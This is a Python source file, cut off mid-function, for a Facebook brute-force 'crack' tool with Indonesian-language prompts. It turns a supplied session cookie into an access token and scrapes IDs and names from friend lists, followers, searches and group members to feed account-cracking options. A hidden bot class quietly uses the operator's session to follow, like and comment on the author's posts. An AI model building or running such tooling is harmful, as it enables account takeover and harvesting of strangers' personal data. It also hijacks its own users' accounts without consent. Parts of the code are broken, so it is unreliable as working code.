#!/usr/bin/python3
# -*- coding: utf-8 -*-
# GAK USAH DI OPRAK" LAGI,sc sudah nya enak
# kalau lu recode data hp lu yang hilang!!
Author    = 'Fikri Sinaga'
Facebook = 'Facebook.com/fikri sinaga'
Instragram = 'Instragram.com/fikri.sinaga'
LicenseKey = '06 Hari'
Version = '0.5'
Fikri  = 100080716718035
Postingan = 115753054458585
komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
##### >>>> IMPORT MODULE
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
##### BUAT WARNA >>>> X
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[1;95m"     # Ungu
I = "\x1b[1;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
##### BUAT IMPORT YG BELUM INSTALL AHAHHAA
try:
	import requests
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module requests belum terinstall")
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module bs4 belum terinstall")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError:
	print(f"{B} | ")
	print(f"{P}[*]{M} Module futures belum terinstall")
	os.system("pip install futures")
host = ("https://mbasic.facebook.com")
B = random.choice([J,B,K,J])
#### BUAT BANNER
def banner():
    l1 = ('%s____  ____  _____ __  __ ___ _   _ __  __%s'%(K,P))
    l2 = ('%s|  _ \|  _ \| ____|  \/  |_ _| | | |  \/  |%s'%(P,K))
    l3 = ('%s| |_) | |_) |  _| | |\/| || || | | | |\/| |%s'%(K,P))
    l4 = ('%s|  __/|  _ <| |___| |  | || || |_| | |  | |%s'%(P,K))
    l5 = ('%s|_|   |_| \_\_____|_|  |_|___|\___/|_|  |_|%s'%(K,P))
    l6 = ('%s Multi Brute Force Facebook %s%s %sBy %sMhd Syafii     '%(P,K,Version,P,K))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))


###----------[ TIME ]---------- ###
skrng = datetime.now()
tahun = skrng.year
bulan = skrng.month
hari  = skrng.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Ma7ret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_cek = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bulan < 0 or bulan > 12:
        exit()
    bulan_skrng = bulan - 1
except ValueError:
    exit()
_bulan_ = bulan_cek[bulan_skrng]
tanggal = ("%s-%s-%s"%(hari,_bulan_,tahun))

##### BUAT STR /LEN
id = []
ok = []
cp = []
gabung_sandi = []
tempel_sandi = []
loop=0

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

### BUAT ANIMASI JALAN
def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass
###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id);menu()
    except Exception as e:
      return(username);menu()
    
###----------[ EXCEPTION ]---------- ###
def kecuali(error):
    print(f"{P}[+] Terjadi Kesalahan !")
    print(f"{P}[+] Tidak Dapat Mengeksekusi")
    print(f"{P}[+] Hal Ini Mungkin Terjadi : ")
    print(f"{P}[01] Cookies/Token Invalid")
    print(f"{P}[02] Salah Memasukkan ID")
    print(f"{P}[03] bug Pada Source Code")
    print(f"{P}[04] Bug Pada Requests")
    print(f"{P}[05] Dan Lain-Lain")
    print(f"{P}[•] Jalankan Ulang Source Code Ini : ")
    print(f"{P}[•] python yuki.py")
    exit()

###----------[BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Fikri)];self.komen = ['Abg Manis','Ilfyu Bang','Aku Sayang Abg','Kenalan Yuk Bang']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(menu())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_ = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return (re.search("(EAAG\w+)", get_tok.text).group(1))
        
##### LOGIN TOKEN
def log_cookie():
    os.system("clear")
    banner()
    mkdir_data_login()
    print(f"{B} | ")
    print(f"{P}[*] Jangan gunakan akun pribadi!!")
    print(f"{B} | ")
    cookie=str(input(f"{P}[*] Masukan cookie : {B}"))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        bot_author(coki,token,cookie)
        open('login/token.json', 'w').write(token)
        open('login/cookie.json','w').write(cookie)
        menu()
    except requests.exceptions.ConnectionError:print(f"{P}[•] Tidak Ada Koneksi Internet ");exit()
    except (KeyError,IOError,AttributeError):print(f"{P}[•] Cookies Invalid ");exit()
  
    
###### BUAT MENU
def menu():
    global gabung_sandi, tempel_sandi
    resik()
    gabung_sandi, tempel_sandi = [], []
    try:
        token=open("login/token.json","r").read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        language(cookie)
        get  = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
        gt = requests.get('http://ipinfo.io/json').json()
        lolo=json.loads(get.text)
        lolol=lolo['name']
        lolol_id=lolo['id']
        link = lolo['link']
    except (KeyError,IOError):
        print(f"{B} | ")
        print(f"{B} | ")
        jalan(f"{P}[!]{M} cookie failed.");log_cookie()
    os.system("clear");banner()
    print(f"{B} | ")
    jalan(f"{P}[•] Nama akun      : {B}{lolol}") 
    print(f"{P}[•] User id        : {B}{lolol_id}")
    print(f"{P}[•] Url Facebook   : {B}{link}")
    print(f"{P}[•] Alamat ipadres : {B}{gt['ip']}")
    print(f"{P}[•] Region         : {B}{gt['region']}")
    print(f"{P}[•] Info kuota     : {B}{gt['org']}")
    print(f"{P}[•] Time zone      : {B}{gt['timezone']}")
    print(f"{P}[•] City           : {B}{gt['city']}")
    jalan(f"{P}[•] License Kamu   : {B}{LicenseKey}")
    print(f"{B} | ")
    print(f"{B}___________________________________________")
    print(f"{B} | ")
    jalan(f"{P}[1] Crack From ID Friendlist")
    print(f"{P}[2] Crack From ID Followers")
    print(f"{P}[3] Crack From ID Search Name")
    print(f"{P}[4] Crack From ID Group")
    print(f"{P}[5] Crack From ID FL dan FL")
    print(f"{P}[6] Ganti user-agent")
    print(f"{P}[7] Chek results crack")
    print(f"{P}[8] Chek opsi account chekpoint")
    jalan(f"{M}[0] Log Out ")
    print(f"{B} | ")
    pp = input(f"{P}[•] Pilih Mana : {B}")
    if pp in ["1","01"]:  gabung_sandi.append(Author);publik();fii_xd()
    elif pp in ["2","02"]: tempel_sandi.append('Jangan');main_folls();fii_xd()
    elif pp in ["3","03"]: gabung_sandi.append('direcode');namee()
    elif pp in ["4","04"]: gabung_sandi.append('Mampus');grup()
    elif pp in ["5","05"]: gabung_sandi.append('Erorkan');teman_teman()
    elif pp in ["6","06"]:
        userset()
    elif pp in ["7","07"]:
      cek_log()
    elif pp in ["8","08"]:
        cek_hasil()
    elif pp in ["0","00"]:
      print(f'{B} | ')
      print(f'{P}[•] Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!!{B}- Mhd Syafii -')
      print(f'{B} | ')
      print(f'{P}[•] Dengan Log Out Maka Seluruh Data Login Akan Terhapus. Berikut Adalah Data Yang Akan Dihapus :{B}[•]{P}Token/Cookies')
      print(f'{B} | ')
      input(f'{P}[•][{M}Enter Untuk Log Out{M}]')
      try:shutil.rmtree('login')
      except:pass
      exit()
    else:print(f'{M}[•] Isi Yang Benar !!');menu()

###----------[ DUMP ID PUBLIC ]---------- ###
def publik():
    global file_dump
    try:
        try:
            token  = open('login/token.json','r').read()
            cookie = {'cookie':open('login/cookie.json','r').read()}
        except:
            print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
            log_cookie()
        print(' | ')
        print('%s[%s•%s] %sContoh : 100080716718035,100080716717023'%(J,P,J,P))
        print(' | ')
        tid = input('%s[%s•%s] %sID Target : %s'%(J,P,J,P,J)).split(',')
        file_dump = 'dump/%s.json'%(tid[0])
        try:os.remove(file_dump)
        except:pass
        for id in tid :
            try:
                url = requests.Session.get("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(id,token),cookies,cookie)
                jso = json.loads(url.text)
                if len(gabung_sandi) != 1:
                        for x in range(Postingan):
                            open(file_dump,'a+').write('fik\n')
                else:
                        for d in jso["friends"]["data"]:
                            try:open(file_dump,'a+').write('%s=%s\n'%(d['id'],d['name']))
                            except:continue
            except Exception as e:print(f'{P}[•] User ID Tidak Di temukan');menu()
        jum = open(file_dump,'r').read().splitlines()
        print(' | ')
        print('%s[%s•%s] %sBerhasil Dump %s%s %sID'%(J,P,J,P,J,str(len(jum)),P))
        print(' | ')
        print('%s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
    except Exception as e:print(f'{P}[•] User ID Tidak Di temukan');menu()
###----------[ DUMP ID FOLLOWERS ]---------- ###
def main_folls():
    global file_dump,cookie
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
    except:
        print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
        log_cookie()
    print(' | ')
    id = input('%s[%s•%s] %sID Target : %s'%(J,P,J,P,J))
    url = ('https://graph.facebook.com/%s/subscribers?limit=10000&access_token=%s'%(id,token))
    file_dump = 'dump/%s.json'%(id)
    try:os.remove(file_dump)
    except:pass
    open(file_dump,'w').write('')
    exec_folls(url,token,file_dump)
    print(' | ')
    print("%s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file_dump,'r').read().splitlines()),P))
    print(' | ')
    print('%s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
def exec_folls(url,token,file):
  print(' | ')
  print("%s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(file,'r').read().splitlines()),P), end='');sys.stdout.flush()
  with requests.Session() as xyz:
        try:
            x = xyz.get(url,cookies=cookie)
            a = json.loads(x.text)
            if len(tempel_sandi) != 1:
                for x in range(Postingan):
                    open(file_dump,'a+').write('fii\n')
            else:
                for b in a['data']:
                    try:
                        f = ('%s=%s\n'%(b['id'],b['name']))
                        if f in open(file,'r').read():continue
                        else:open(file,'a+').write(f)
                    except Exception as e:continue
            y = par(x.text,'html.parser')
            n = re.findall('"after":"(.*?)"},',str(y))[0]
            next = ('https://graph.facebook.com/v1.0/100009340646547/subscribers?access_token=%s&limit=5000&after=%s'%(token,n))
            exec_folls(next,token,file)
        except KeyboardInterrupt:pass
        except (IndexError,TypeError,IOError,KeyError,AttributeError):pass
###----------[ DUMP ID NAME ]---------- ###
class namee:
    def __init__(self):
        global file_dump, urutan_crack
        urutan_crack = '0'
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        print('%s[%s•%s] %sContoh : syafii,fikri,anita'%(J,P,J,P))
        print(' | ')
        put = input('%s[%s•%s] %sNama Target : %s'%(J,P,J,P,J)).split(',')
        data = []
        self.file_dump = ('dump/%s.json'%(put[0]))
        file_dump = self.file_dump
        open(self.file_dump,'w').write('')
        common = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
        for set1 in put:
            data.append(set1)
            for set2 in common:data.append(set2+' '+set1)
        for set3 in data:url = 'https://mbasic.facebook.com/search/people/?q='+set3;self.exec(url,cookie)
        self.lanjut()
    def exec(self,url,cookie):
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                spam = pra.find_all('h2')[0]
                if 'Anda Diblokir Sementara' in spam.text:print("%s[%s•%s] %sAkun Anda Terkena Spam %s!%s"%(M,P,M,P,M,P), end='');sys.stdout.flush()
                else:
                  print(' | ')
                  print("%s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P), end='');sys.stdout.flush()
                for temu in pra.find_all('a',href=True):
                    if "<img alt=" in str(temu):
                        if "home.php" in str(temu["href"]):continue
                        else:
                            try:
                                if 'profile.php' in str(temu["href"]):
                                    find = re.findall('"/profile\.php\?id=(.*?)&"',str(temu))[0]
                                    if len(find) !=0:
                                        id   = ''.join(find)
                                        nama = temu.find("img").get("alt").replace(", profile picture","")
                                        file = open(self.file_dump,'r').read()
                                        if len(gabung_sandi) != 1:
                                            for x in range(Postingan):
                                                open(file_dump,'a+').write('fii\n')
                                        else:
                                            if id in file:continue
                                            else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                                elif 'refid' in str(temu["href"]):
                                    find = re.findall("/(.*?)\?",str(temu))[0]
                                    if len(find) !=0:
                                        id   = convert_id(''.join(find))
                                        kat  = id.split('.')[0] + '.' + id.split('.')[1]
                                        nama = temu.find("img").get("alt").replace(", profile picture","")
                                        file = open(self.file_dump,'r').read()
                                        if len(gabung_sandi) != 1:
                                            for x in range(Postingan):
                                                open(file_dump,'a+').write('fik\n')
                                        else:
                                            if id in file:continue
                                            else:
                                                if kat in file:continue
                                                else:open(self.file_dump,'a+').write('%s=%s\n'%(id,nama))
                            except (IndexError,ValueError,IOError):continue
                            except KeyboardInterrupt:exit(self.lanjut())
                for tamu in pra.find_all('a',href=True):
                    if 'Lihat Hasil Selanjutnya' in tamu.text:new_url = tamu['href'];self.exec(new_url,cookie)
        except KeyboardInterrupt:exit(self.lanjut())
    def lanjut(self):
        print(' | ')
        print("%s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.file_dump,'r').read().splitlines()),P))
        print(' | ')
        print('%s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
        
###----------[ DUMP ID GROUP ]---------- ###
class grup:
    def __init__(self):
        global urutan_crack
        urutan_crack = '0'
        self.datagrup = {}
        self.looping  = 0
        try:cookie = {'cookie':open('login/cookie.json','r').read()}
        except Exception as e:kecuali(e)
        self.main_grup(cookie)
    def main_grup(self,cookie):
        print('')
        print(f"{J}[{A}1{J}] {P}Bergabung")
        print(f"{J}[{A}2{J}] {P}Nama")
        print(f"{J}[{A}3{J}] {P}ID")
        print(' | ')
        ty = input('[•] %sPilih :%s'%(A,J))
        if ty in ['1','01','a']:
            print(' | ')
            self.file = ('dump/mygroup.json')
            open(self.file,'w').write('')
            url= 'https://mbasic.facebook.com/groups/?seemore&refid=1000'
            self.cari_gabung(url,cookie)
        elif ty in ['2','02','b']:
            print(' | ')
            put = input('%s[%s•%s] %sMasukkan Nama Grup : %s'%(J,P,J,P,J))
            print(' | ')
            self.file = ('dump/%s.json'%(put.replace(' ','_')))
            open(self.file,'w').write('')
            url = 'https://mbasic.facebook.com/search/groups/?q=' + put
            self.cari_nama(url,cookie)
        elif ty in ['3','03','c']:
            print(' | ')
            self._id_ = input('%s[%s•%s] %sMasukkan ID Grup : %s'%(J,P,J,P,J))
            self._pil_ = True
            print(' | ')
            self.second_grup(cookie)
        else:print('%s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def cari_gabung(self,url,cookie):
        with requests.Session() as xyz:
            req = xyz.get(url,cookies=cookie)
            pra = par(req.content,'html.parser')
            for c in pra.find_all('a'):
                try:
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall('https://mbasic.facebook.com/groups/(.*?)/',str(link))[0]
                        dt = self.data_grup(id,cookie)
                        if 'Anda Diblokir Sementara' in str(dt):
                            self.looping += 1
                            print("%s[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                        else:
                            self.looping += 1
                            tar = str(self.looping)
                            print(f"{A} • ID Grup : {id}{dt}")
                            self.datagrup.update({str(self.looping):id})
                    else:continue
                except KeyboardInterrupt:pass
    def cari_nama(self,url,cookie):
        try:
            with requests.Session() as xyz:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for c in pra.find_all('a'):
                    if 'mbasic.facebook.com/groups' in str(c):
                        link = str(c['href'])
                        id = re.findall('https://mbasic.facebook.com/groups/(.*?)/',str(link))[0]
                        if id not in open(self.file,'r').read():
                            open(self.file,'a+').write(id+'\n')
                            id = open(self.file,'r').read().splitlines()[-1]
                            dt = self.data_grup(id,cookie)
                            if 'Grup Privat' in str(dt):continue
                            elif 'Anda Diblokir Sementara' in str(dt):self.looping += 1;print("%s[%s•%s] %sAkun Anda Terkena Spam! %s[%s%s%s]%s"%(M,P,M,P,M,P,str(self.looping),M,P), end='');sys.stdout.flush()
                            else:
                                self.looping += 1
                                tar = str(self.looping)
                                print(f"{A} • ID Grup : {id}{dt}")
                                self.datagrup.update({str(self.looping):id})
                        else:continue
                    else:continue
                for c in pra.find_all('a'):
                    if 'Lihat Hasil Selanjutnya' in c.text:
                        new_url = c['href']
                        self.cari_nama(new_url,cookie)
        except KeyboardInterrupt:pass
    def data_grup(self,id,cookie):
        try:
            with requests.Session() as xyz:
                url = 'https://mbasic.facebook.com/groups/'+id
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                try:nama = re.findall('<head><title>(.*?)</title>',str(pra))[0]
                except:nama = ''
                try:tipe = re.findall('</div></h1><div class=\".*?\">(.*?)</div></td></tr></tbody></table></a></td>',str(pra))[0]
                except:tipe = ''
                try:member = re.findall('Anggota</a></td><td class=\".*?\"><span class=\".*?\" id=\".*?\">(.*?)</span></td></tr></tbody></table></li>',str(pra))[0]
                except:member = ''
                zyx = ('\n • Nama : %s\n • Tipe : %s\n • Anggota : %s'%(nama,tipe,member))
                return(zyx)
        except KeyboardInterrupt:
            self._pil_ = False
            exit(self.second_grup(cookie))
    def second_grup(self,cookie):
        global file_dump
        if self._pil_ == True:pro = self._id_
        else:
            coy =  input('[•] %sPilih :%s'%(A,J))
            print(' | ')
            try:pro = self.datagrup[coy]
            except Exception as e:kecuali(e)
        self.files = ('dump/%s.json'%(pro.replace(' ','_')))
        file_dump = self.files
        open(self.files,'w').write('')
        print(f"{J}[{A}1{J}] {P}ID Member")
        print(f"{J}[{A}2{J}] {P}ID Post")
        print(' | ')
        cuy = input('[•] %sPilih :%s'%(A,J))
        if cuy in ['1','01','a']:
            url_member = 'https://mbasic.facebook.com/browse/group/members/?id=' + pro
            self.dump_member(url_member,cookie)
            print(' | ')
            print("%s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print(' | ')
            print('%s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
            fii_xd()
        elif cuy in ['2','02','b']:
            url_grup = 'https://mbasic.facebook.com/groups/' + pro
            self.dump_post(url_grup,cookie)
            print(' | ')
            print("%s[%s•%s] %sBerhasil Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P))
            print(' | ')
            print('%s[%s•%s] %sFile : %s%s %s'%(J,P,J,P,J,file_dump,P))
            fii_xd()
        else:
          print(' | ')
          print('%s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def dump_member(self,url,cookie):
        print(' | ')
        print("%s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a',href=True):
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fii\n')
                        else:
                            try:
                                fel = open(self.files,'r').read()
                                if 'profile.php' in po['href']:
                                    id = str(po['href']).split('=')[1]
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                                else:
                                    id = str(po['href']).replace('/','')
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            except Exception as e:continue
                for pa in pra.find_all('a',href=True):
                    if 'Lihat Selengkapnya' in pa.text:
                        new_url = 'https://mbasic.facebook.com' + pa['href']
                        self.dump_member(new_url,cookie)
            except KeyboardInterrupt:pass
    def dump_post(self,url,cookie):
        print(' | ')
        print(" %s[%s•%s] %sSedang Mengambil %s%s %sID"%(J,P,J,P,J,len(open(self.files,'r').read().splitlines()),P), end='');sys.stdout.flush()
        with requests.Session() as xyz:
            try:
                req = xyz.get(url,cookies=cookie)
                pra = par(req.content,'html.parser')
                for pe in pra.find_all('h3'):
                    for po in pe.find_all('a',href=True):
                        if len(gabung_sandi) != 1:
                            for x in range(Postingan):
                                open(file_dump,'a+').write('fii\n')
                        else:
                            try:
                                fel = open(self.files,'r').read()
                                if 'mbasic.facebook.com' in po['href']:pass
                                elif 'story.php' in po['href']:pass
                                elif 'Halaman' in po.text:pass
                                elif 'profile.php' in po['href']:
                                    id = re.findall('profile\.php\?id=(.*?)&',str(po['href']))[0]
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                                else:
                                    ud = re.findall('\/(.*?)\/\?refid',str(po['href']))[0]
                                    id = convert_id(ud)
                                    nm = po.text
                                    if id in fel:pass
                                    else:open(self.files,'a+').write('%s=%s\n'%(id,nm))
                            except Exception as e:continue
                for pa in pra.find_all('a',href=True):
                    if 'Lihat Postingan Lainnya' in pa.text:
                        new_url = 'https://mbasic.facebook.com' + pa['href']
                        self.dump_post(new_url,cookie)
            except KeyboardInterrupt:pass

###----------[ DUMP ID FRIENDLIST FROM FRIENDLIST ]---------- ###
class teman_teman:
    def __init__(self):
        global file_dump
        urutan_crack = '0'
        try:
            cook    = open('login/cookie.json','r').read()
            cookie  = {'cookie':cook}
            token   = open('login/token.json','r').read()
            self.my = re.search('c_user=(.*?);',str(cook)).group(1)
        except Exception as e:print(e);exit()
        print(' | ')
        self.target = input('%s[%s•%s] %sMasukkan ID : %s'%(J,P,J,P,J))
        print(' | ')
        pl = input('%s[%s•%s] %sPilih ID Muda/Tua [m/t] : %s'%(J,P,J,P,J))
        if pl in ['1','01','m','M','a']:
            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={token}'
            self.files = ('dump/muda_%s.json'%(self.target))
            file_dump = self.files
            open(self.files,'w').write('')
            self.muda_dev(url,cookie,token,True)
        elif pl in ['2','02','t','T','b']:
            url = f'https://graph.facebook.com/{self.target}?fields=friends.fields(id,name)&access_token={token}'
            self.files = ('dump/tua_%s.json'%(self.target))
            file_dump = self.files
            open(self.files,'w').write('')
            self.tua_dev(url,cookie,token,True)
        else:print('%s[%s•%s] %sIsi Yang Benar %s!%s\n'%(M,P,M,P,M,P));exit()
    def muda_dev(self,url,cookie,token,stat):
        with requests.Session() as xyz:
            try:
                if stat == True:
                    id1, id2, id3 = [], [], []
                    for x in xyz.get(url,cookies=cookie).json()['friends']['data']:id1.append('%s=%s\n'%(x['id'],x['name']))
                    for y in id1:id2.insert(0,y)
                    for z in id2:
                        id3.append(z)
                        if len(id3) == 100:break
                    for p in id3:
                        q = p.split('=')[0]
                        url = f'https://graph.facebook.com/{q}?fields=friends.fields(id,name)&access_token={token}'
                        self.muda_dev(url,cookie,token,False)
                else:
                    id4, id5, id6 = [], [], []
                    self.target = re.search('com\/(.*?)\?',url).group(1)
                    for a in xyz.get(url,cookies=cookie).json()['friends']['data']:id4.append('%s=%s\n'%(a['id'],a['name']))
                    for b in id4:id5.insert(0,b)
                    for c in id5:
                        id6.append(c)
                        if len(id6) == 100:break
                    for o in id6:
                        l = open(self.files,'r').read()
                        u = o.split('=')[0]
